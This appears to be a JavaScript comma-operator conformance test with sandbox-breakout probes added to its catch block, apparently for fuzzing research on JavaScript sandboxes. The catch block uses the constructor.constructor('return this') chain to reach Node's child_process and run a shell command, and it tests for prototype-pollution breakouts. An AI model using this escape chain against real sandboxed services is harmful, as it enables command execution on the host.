try {
    var x = 0;
    var y = 0;
    var z = 0;
    if ((x = 1, y = 2, z = 3) !== 3) {
        $ERROR('#1: var x = 0; var y = 0; var z = 0; (x = 1, y = 2, z = 3) === 3. Actual: ' + (x = 1, y = 2, z = 3));
    }
    var x = 0;
    var y = 0;
    var z = 0;
    x = 1, y = 2, z = 3;
    if (x !== 1) {
        $ERROR('#2: var x = 0; var y = 0; var z = 0; x = 1, y = 2, z = 3; x === 1. Actual: ' + x);
    }
    if (y !== 2) {
        $ERROR('#3: var x = 0; var y = 0; var z = 0; x = 1, y = 2, z = 3; y === 2. Actual: ' + y);
    }
    if (z !== 3) {
        $ERROR('#4: var x = 0; var y = 0; var z = 0; x = 1, y = 2, z = 3; z === 3. Actual: ' + z);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}